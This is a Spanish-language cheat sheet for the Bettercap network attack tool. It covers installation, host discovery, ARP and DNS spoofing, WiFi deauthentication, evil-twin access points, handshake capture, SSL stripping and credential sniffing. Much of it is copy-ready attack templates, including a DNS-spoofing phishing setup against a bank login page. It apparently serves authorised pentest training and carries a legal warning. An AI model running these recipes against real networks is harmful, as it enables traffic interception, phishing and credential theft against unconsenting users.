# 🦈 Bettercap - Guía rápida del framework de ataques de red

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Navaja suiza para ataques de red
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

---

## 📋 Índice

- [¿Qué es Bettercap?](#-qué-es-bettercap)
- [Instalación](#-instalación)
- [Uso básico](#-uso-básico)
- [Reconocimiento de red](#-reconocimiento-de-red)
- [Suplantación ARP (MITM)](#-suplantación-arp-mitm)
- [Suplantación DNS](#-suplantación-dns)
- [Ataques WiFi](#-ataques-wifi)
- [Degradación de HTTPS](#-degradación-de-https)
- [Captura de credenciales](#-captura-de-credenciales)
- [Caplets](#-caplets)
- [Web UI](#-web-ui)
- [Referencia rápida](#-referencia-rápida)

---

## 🎯 ¿Qué es Bettercap?

**Bettercap** es una navaja suiza para el reconocimiento de redes, WiFi y Bluetooth. Se presenta como sucesor de Ettercap y ofrece funciones modernas:

- 🔍 **Reconocimiento de red** - Descubrir hosts y servicios
- 🎭 **Ataques MITM** - Suplantación ARP y DNS
- 📶 **Ataques WiFi** - Desautenticación, evil twin y captura del intercambio de autenticación
- 🔓 **Captura de credenciales** - HTTP y HTTPS mediante degradación
- 📡 **Bluetooth/BLE** - Descubrimiento de dispositivos y ataques
- 🌐 **Interfaz web** - Interfaz visual

### Funciones

| Función | Descripción |
|---------|-------------|
| **Modular** | Ampliable mediante caplets |
| **Interactivo** | Consola de comandos en tiempo real |
| **Automatizable** | Automatizar mediante archivos caplet |
| **Web UI** | Interfaz en el navegador |
| **Lenguaje Go** | Rápido, moderno y multiplataforma |

---

## 🚀 Instalación

### Kali Linux (preinstalado)

```bash
# Ya está instalado en Kali
bettercap --help

# Actualizar
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### Desde el código fuente

```bash
# Instalar primero Go
sudo apt install golang

# Instalar Bettercap
go install github.com/bettercap/bettercap@latest

# O bien
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### Instalar la interfaz (opcional)

```bash
# Descargar la interfaz web
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

## 💻 Uso básico

### Iniciar Bettercap

```bash
# Inicio básico (requiere root)
sudo bettercap

# Especificar la interfaz
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Modo no interactivo (ejecutar comandos)
sudo bettercap -eval "net.probe on; net.show"

# Cargar un archivo caplet
sudo bettercap -caplet http-ui
```

### Consola interactiva

```bash
# Dentro de la consola de Bettercap
» help                      # Mostrar todos los comandos
» help net.probe            # Ayuda de un módulo concreto
» net.show                  # Mostrar los hosts descubiertos
» set arp.spoof.targets X   # Establecer una variable
» arp.spoof on              # Activar un módulo
» quit                      # Salir
```

### Gestión de módulos

```bash
# Listar todos los módulos
» help

# Obtener información del módulo
» help arp.spoof

# Activar un módulo
» arp.spoof on

# Desactivar un módulo
» arp.spoof off

# Ver la configuración del módulo
» get arp.spoof.*
```

---

## 🔍 Reconocimiento de red

### Descubrimiento de hosts

```bash
# Activar el sondeo de red
» net.probe on

# Mostrar los hosts descubiertos
» net.show

# Salida:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### Información de red

```bash
# Mostrar la interfaz actual
» net.show

# Información de la interfaz
» get net.interface.*

# Información de la puerta de enlace
» get gateway.*
```

### Opciones de sondeo

```bash
# Establecer el intervalo de sondeo
» set net.probe.throttle 10

# Modo pasivo (solo escuchar)
» set net.probe.passive true

# Establecer el tiempo de espera del sondeo
» set net.probe.timeout 500
```

### Comandos de reconocimiento

```bash
# Reconocimiento completo
» net.recon on

# Borrar los hosts
» net.clear

# Mostrar solo los activos, según el original
» set net.show.meta true
» net.show

# Exportar a un archivo
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

> **Interpretación del reconocimiento:** `net.show` lista hosts conocidos; `net.sniff.output` guarda paquetes, no exporta una lista de hosts. La disponibilidad y función de variables como `net.probe.passive`, `net.probe.timeout` o `net.show.meta` deben comprobarse mediante la ayuda del módulo de tu versión.

## 🎭 Suplantación ARP (MITM)

### Suplantación ARP básica

```bash
# Iniciar Bettercap
sudo bettercap -iface eth0

# Activar el sondeo
» net.probe on

# Esperar y mostrar los hosts
» net.show

# Establecer el objetivo
» set arp.spoof.targets 192.168.1.100

# Activar la suplantación ARP
» arp.spoof on

# ¡Ahora estás en posición MITM, según el original!
```

### Full duplex (ambas direcciones)

```bash
# Suplantar tanto al objetivo como a la puerta de enlace
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### Suplantar una subred completa

```bash
# Seleccionar todos los hosts (excepto la puerta de enlace)
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Solo interno (sin suplantar la puerta de enlace)
» set arp.spoof.internal true
» arp.spoof on
```

### Suplantación ARP y captura de tráfico

```bash
# Configuración completa de MITM
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

## 🌐 Suplantación DNS

### Suplantación DNS básica

```bash
# Establecer los dominios para suplantación DNS
» set dns.spoof.domains example.com, *.example.com

# Establecer la dirección de redirección (tu equipo)
» set dns.spoof.address 192.168.1.50

# Activar (requiere suplantación ARP según el ejemplo)
» arp.spoof on
» dns.spoof on
```

### Suplantar todos los dominios

```bash
# Comodín: redirigir todo
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Varios dominios

```bash
# Lista de dominios
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Suplantación DNS con un servidor HTTP

```bash
# Configuración completa de phishing
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# Iniciar el servidor HTTP en tu equipo
» set http.server.path /var/www/phishing
» http.server on
```

---

## 📶 Ataques WiFi

### Activar el modo WiFi

```bash
# Iniciar con la interfaz WiFi
sudo bettercap -iface wlan0

# Activar el reconocimiento WiFi
» wifi.recon on

# Mostrar los puntos de acceso descubiertos
» wifi.show
```

### Reconocimiento WiFi

```bash
# Mostrar todos los puntos de acceso
» wifi.show

# Salida:
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### Ataque de desautenticación

```bash
# Desautenticar todos los clientes de un punto de acceso concreto
» wifi.deauth AA:BB:CC:DD:EE:FF

# Desautenticar un cliente concreto
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Desautenticación continua
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### Captura del intercambio de autenticación (handshake)

```bash
# Activar el reconocimiento WiFi
» wifi.recon on

# Establecer el canal (el mismo que el objetivo)
» wifi.recon.channel 6

# Capturar handshakes
» set wifi.handshakes.file /tmp/handshakes/

# Desautenticar para provocar una reconexión
» wifi.deauth AA:BB:CC:DD:EE:FF

# Revisar los handshakes capturados
» wifi.show.wpa
```

### Ataque evil twin (punto de acceso impostor)

```bash
# Clonar el punto de acceso
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Iniciar el punto de acceso falso
» wifi.ap on

# Desautenticar el punto de acceso real para forzar una conexión, según el original
» wifi.deauth <real_AP_BSSID>
```

> **Alcance de WiFi:** se requiere hardware compatible con modo monitor e inyección. `wifi.ap` anuncia beacons falsos; eso no equivale por sí solo a un punto de acceso funcional con asociación y conectividad. La reconexión al impostor y la obtención de PMKID no están garantizadas. Algunas opciones del original pueden faltar en tu versión. Consulta la [referencia WiFi oficial](https://www.bettercap.org/modules/wifi/).

### Ataque PMKID

```bash
# Ataque moderno sin clientes
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# PMKID capturado en la carpeta de handshakes
» wifi.show.wpa
```

---

## 🔒 Degradación de HTTPS

### SSL strip (elusión de HSTS, según el original)

```bash
# Activar primero la suplantación ARP
» arp.spoof on

# Activar SSL strip
» set https.proxy.sslstrip true
» https.proxy on

# O utilizar el proxy HTTP
» http.proxy on
```

> **Limitación de TLS:** SSL strip no constituye una elusión universal de HSTS. Un proxy HTTPS que vuelve a firmar certificados necesita que el cliente confíe en su CA para evitar errores de validación. Activar ARP spoofing y captura no descifra automáticamente TLS. Véase la [referencia de https.proxy](https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/).

### Proxy HTTPS

```bash
# Configurar el proxy HTTPS
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# Con un certificado
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### Capturar tráfico HTTPS

```bash
# MITM completo con HTTPS
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

## 🔓 Captura de credenciales

### Credenciales HTTP

```bash
# Activar la captura de tráfico
» net.sniff on

# Activar el capturador de tráfico local
» set net.sniff.local true
» net.sniff on

# Filtrar HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### Recopilación de credenciales

```bash
# Captura completa de credenciales
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# Las credenciales aparecen en tiempo real, según el original
```

### Guardar en un archivo

```bash
# Guardar los paquetes capturados
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Salida detallada
» set net.sniff.verbose true
» net.sniff on
```

---

## 📜 Caplets

### ¿Qué son los caplets?

Los caplets son archivos de script (.cap) que automatizan comandos de Bettercap.

### Caplets incluidos

```bash
# Listar los caplets
» caplets.show

# Caplets habituales:
- http-ui       # Interfaz web
- https-ui      # Interfaz web segura
- local-sniffer # Capturar tráfico local
- mitm          # Configuración MITM básica
- pita          # Automatización de ataques WiFi
```

### Cargar un caplet

```bash
# Desde la línea de comandos
sudo bettercap -caplet http-ui

# Dentro de Bettercap
» caplet http-ui

# Desde un archivo
sudo bettercap -caplet /path/to/custom.cap
```

### Crear un caplet personalizado

```bash
# Archivo: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Ejecutar un caplet personalizado
sudo bettercap -caplet my-mitm.cap
```

### Actualizar los caplets

```bash
# Actualizar todos los caplets
» caplets.update
```

---

## 🌐 Web UI

### Iniciar la interfaz web

```bash
# Instalar primero la interfaz
sudo bettercap -eval "caplets.update; ui.update; quit"

# Iniciar con la interfaz web (HTTP)
sudo bettercap -caplet http-ui

# Iniciar con la interfaz HTTPS
sudo bettercap -caplet https-ui

# Acceso: https://127.0.0.1:8080/
# Credenciales predeterminadas: user/pass
```

### Funciones de la interfaz web

| Función | Descripción |
|---------|-------------|
| **Dashboard** | Vista de la red en tiempo real |
| **Hosts** | Dispositivos descubiertos |
| **WiFi** | Redes inalámbricas |
| **BLE** | Dispositivos Bluetooth |
| **Events** | Registro de actividad |
| **Packets** | Tráfico capturado |

> **Compatibilidad de la interfaz:** los caplets, URL y puertos del original pueden diferir de tu versión. La autenticación de la API utiliza parámetros `api.rest.username` y `api.rest.password`; los parámetros de `http.server` no deben confundirse con los de la API. Consulta la [guía de la interfaz](https://www.bettercap.org/usage/web_ui/) y la [referencia de api.rest](https://www.bettercap.org/modules/core/apirest/).

### Configurar la interfaz web

```bash
# Establecer las credenciales
» set http.server.username admin
» set http.server.password secretpass

# Establecer el puerto
» set http.server.port 8080

# Dirección de escucha
» set http.server.address 0.0.0.0
```

---

## 📊 Referencia rápida

### Comandos esenciales

| Comando | Descripción |
|---------|-------------|
| `net.probe on` | Iniciar el descubrimiento de hosts |
| `net.show` | Mostrar los hosts descubiertos |
| `arp.spoof on` | Activar la suplantación ARP |
| `net.sniff on` | Iniciar la captura de paquetes |
| `dns.spoof on` | Activar la suplantación DNS |
| `wifi.recon on` | Iniciar el reconocimiento WiFi |
| `wifi.deauth BSSID` | Ataque de desautenticación |
| `https.proxy on` | Activar el proxy HTTPS |

### Variables habituales

| Variable | Descripción |
|----------|-------------|
| `arp.spoof.targets` | Objetivos del MITM |
| `arp.spoof.fullduplex` | Suplantar en ambas direcciones |
| `dns.spoof.domains` | Dominios que se suplantarán |
| `dns.spoof.address` | IP de redirección |
| `net.sniff.output` | Archivo PCAP de salida |
| `wifi.ap.ssid` | Nombre del punto de acceso falso |

### Plantilla de ataque MITM

```bash
# MITM básico
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### Plantilla de ataque WiFi

```bash
# Desautenticación WiFi y captura
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### Ataque de phishing completo

```bash
# Suplantación DNS y sitio falso
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

## ⚠️ Aviso legal

```
⚠️ ADVERTENCIA: Bettercap es una herramienta potente que puede interceptar
tráfico de red. Utilízala únicamente en redes PROPIAS o para las que tengas
AUTORIZACIÓN EXPRESA POR ESCRITO para realizar pruebas.

✅ Pruebas de penetración autorizadas
✅ Investigación de seguridad en un laboratorio
✅ Fines educativos

❌ La interceptación no autorizada es ILEGAL
❌ No utilizar en redes públicas
❌ No robar credenciales
```

---

## 📚 Recursos

- [Sitio oficial de Bettercap](https://www.bettercap.org/)
- [Bettercap GitHub](https://github.com/bettercap/bettercap)
- [Documentación de Bettercap](https://www.bettercap.org/modules/)
- [Caplets](https://github.com/bettercap/caplets)

### Guías rápidas relacionadas
- [Aircrack-ng](../../Aircrack-ng/translations/README.es.md)
- [Wifite](../../Wifite/translations/README.es.md)
- [Wireshark](../../Wireshark/translations/README.es.md)

---

<p align="center">
  <b>🦈 ¡Domina los ataques de red!</b><br>
  <i>Bettercap - La navaja suiza del pentesting de redes</i>
</p>
